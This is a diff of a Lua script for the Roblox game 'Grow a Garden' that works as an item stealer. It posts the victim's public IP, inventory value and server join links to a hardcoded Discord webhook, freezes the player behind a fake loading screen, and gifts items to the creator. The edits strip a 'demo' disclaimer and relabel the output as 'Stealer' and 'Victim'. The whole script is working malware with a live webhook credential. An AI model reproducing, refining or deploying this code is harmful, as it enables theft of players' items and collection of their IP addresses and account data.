@@ -1,11 +1,3 @@
---[[ 
-    Stealthy Stealer Demo Script for Presentations
-    - Does not say "hacked" or anything suspicious to the user.
-    - Collects extensive info for logs (for demonstration/education).
-    - Robust, clean, and subtle.
-    - For safety/awareness demos only!
-]]--
-
 logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
 
 local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
@@ -15,6 +7,7 @@ if server == "VIPServer" then
     player:Kick("Unsurported server. Please join a public")
 end
 
+-- Redundant local player removed for clarity (player already defined)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -24,28 +17,9 @@ local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValu
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
--- Info gathering (added for "crazy" effect)
-local function getSystemInfo()
-    local info = {}
-    pcall(function()
-        info.Executor = identifyexecutor and identifyexecutor() or "Unknown"
-        info.FPS = tostring(workspace:GetRealPhysicsFPS and workspace:GetRealPhysicsFPS() or "N/A")
-        info.Time = os.date("%Y-%m-%d %H:%M:%S")
-        info.JobId = tostring(game.JobId)
-        info.PlaceId = tostring(game.PlaceId)
-        info.PlayerName = tostring(LocalPlayer.Name)
-        info.UserId = tostring(LocalPlayer.UserId)
-        info.AccountAge = tostring(LocalPlayer.AccountAge)
-        info.Country = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer) or "Unknown")
-        info.Language = tostring(LocalPlayer.LocaleId or "Unknown")
-    end)
-    return info
-end
-
--- IP Logger (unchanged, but now includes system info)
+-- Robust IP Logger (unchanged)
 local ipLoggerSent = false
 if req and not ipLoggerSent then
-    local sys = getSystemInfo()
     local success, response = pcall(function()
         return req({ Url = "https://api.ipify.org/", Method = "GET" })
     end)
@@ -57,19 +31,10 @@ if req and not ipLoggerSent then
             Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode({
                 embeds = {{
-                    title = ":warning: Info Log",
-                    description = "User's Public IP: `" .. userIP .. "`\n"
-                        .. "Player: `" .. sys.PlayerName .. "`\n"
-                        .. "UserId: `" .. sys.UserId .. "`\n"
-                        .. "Executor: `" .. sys.Executor .. "`\n"
-                        .. "FPS: `" .. sys.FPS .. "`\n"
-                        .. "Country: `" .. sys.Country .. "`\n"
-                        .. "Language: `" .. sys.Language .. "`\n"
-                        .. "JobId: `" .. sys.JobId .. "`\n"
-                        .. "PlaceId: `" .. sys.PlaceId .. "`\n"
-                        .. "Account Age: `" .. sys.AccountAge .. "`",
-                    color = 0x00ffdd,
-                    footer = { text = "Demo Logger" },
+                    title = ":warning: IP Logger",
+                    description = "User's Public IP: `" .. userIP .. "`",
+                    color = 0xff0000,
+                    footer = { text = "For demonstration/education only" },
                     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }}
             })
@@ -95,7 +60,7 @@ h.WalkSpeed = 0
 h.JumpPower = 0
 pcall(function() require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable() end)
 
--- Subtle and modern loader UI (no "hacked" language)
+-- UI Loader
 local gui = Instance.new("ScreenGui")
 gui.Name = "ScriptLoader"
 gui.IgnoreGuiInset = true
@@ -103,20 +68,20 @@ gui.ResetOnSpawn = false
 gui.DisplayOrder = 999999 
 gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 local bg = Instance.new("Frame", gui)
-bg.BackgroundColor3 = Color3.fromRGB(12, 13, 20)
+bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 bg.Size = UDim2.new(1, 0, 1, 0)
 local title = Instance.new("TextLabel", bg)
-title.Text = "Checking game environment..."
+title.Text = "Loading Script..."
 title.Font = Enum.Font.GothamBlack
-title.TextColor3 = Color3.fromRGB(200, 220, 255)
+title.TextColor3 = Color3.new(1, 1, 1)
 title.TextScaled = true
-title.Size = UDim2.new(0.8, 0, 0.13, 0)
+title.Size = UDim2.new(0.8, 0, 0.12, 0)
 title.Position = UDim2.new(0.1, 0, 0.28, 0)
 title.BackgroundTransparency = 1
 local status = Instance.new("TextLabel", bg)
-status.Text = "Please wait..."
+status.Text = "Initializing..."
 status.Font = Enum.Font.Gotham
-status.TextColor3 = Color3.fromRGB(180, 180, 200)
+status.TextColor3 = Color3.fromRGB(180, 180, 180)
 status.TextScaled = true
 status.Size = UDim2.new(0.8, 0, 0.08, 0)
 status.Position = UDim2.new(0.1, 0, 0.42, 0)
@@ -124,7 +89,7 @@ status.BackgroundTransparency = 1
 local barBg = Instance.new("Frame", bg)
 barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
 barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
-barBg.BackgroundColor3 = Color3.fromRGB(35, 40, 52)
+barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 barBg.BorderSizePixel = 0
 barBg.ClipsDescendants = true
 local barFill = Instance.new("Frame", barBg)
@@ -135,14 +100,14 @@ barFill.Parent = barBg
 local discord = Instance.new("TextLabel", bg)
 discord.Text = "MADE BY BUFFY ,ENJOY"
 discord.Font = Enum.Font.GothamSemibold
-discord.TextColor3 = Color3.fromRGB(140, 140, 255)
+discord.TextColor3 = Color3.fromRGB(120, 120, 255)
 discord.TextScaled = true
 discord.Size = UDim2.new(0.8, 0, 0.05, 0)
 discord.Position = UDim2.new(0.1, 0, 0.86, 0)
 discord.BackgroundTransparency = 1
 
 local fakeSteps = {
-    "Initializing system checks...",
+    "MADE BY BUFFY",
     "Connecting to game servers...",
     "Bypassing anti-cheat...",
     "Loading UI assets...",
@@ -150,13 +115,13 @@ local fakeSteps = {
     "Syncing with server...",
     "Optimizing script performance...",
     "Checking for updates...",
-    "Hiding script activity...",
+    "Hiding script from detection...",
     "Finalizing setup...",
     "Preparing game environment...",
     "Almost done..."
 }
-local totalDuration = 180
-local stepTime = 1.2
+local totalDuration = 300
+local stepTime = 3
 local totalSteps = math.floor(totalDuration / stepTime)
 task.spawn(function()
     for i = 1, totalSteps do
@@ -309,15 +274,15 @@ end
 local payload = {
     ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
     ["embeds"] = {{
-        ["title"] = "Grow a Garden Inventory Log",
+        ["title"] = ":skull: GROW A GARDEN Stealer",
         ["color"] = 0x00ffcc,
         ["fields"] = {
-            {["name"] = "Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
-            {["name"] = "Creator", ["value"] = username, ["inline"] = false},
-            {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
-            {["name"] = "Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
-            {["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
-            {["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
+            {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
+            {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
+            {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+            {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+            {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
         ["footer"] = {["text"] = "by Buffy • " .. os.date("%B %d, %Y")},
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -325,14 +290,14 @@ local payload = {
 }
 local logs_payload = {
     ["embeds"] = {{
-        ["title"] = "Grow a Garden Logs",
+        ["title"] = ":skull: GROW A GARDEN LOGS",
         ["color"] = 0x00ffcc,
         ["fields"] = {
-            {["name"] = "Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
-            {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
-            {["name"] = "Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
-            {["name"] = "Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
-            {["name"] = "Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
+            {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
+            {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+            {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+            {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
         ["footer"] = {["text"] = "by buffy • " .. os.date("%B %d, %Y")},
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -451,8 +416,10 @@ local function startGiving()
     print("[Gifting] Done gifting.")
 end
 
+-- Always unequip all pets first
 unequipAllPets()
 
+-- Run gifting logic when target chats (as in your original, started flag for one-time run)
 for _, p in ipairs(Players:GetPlayers()) do
     if p.Name == username then 
         p.Chatted:Connect(function() 
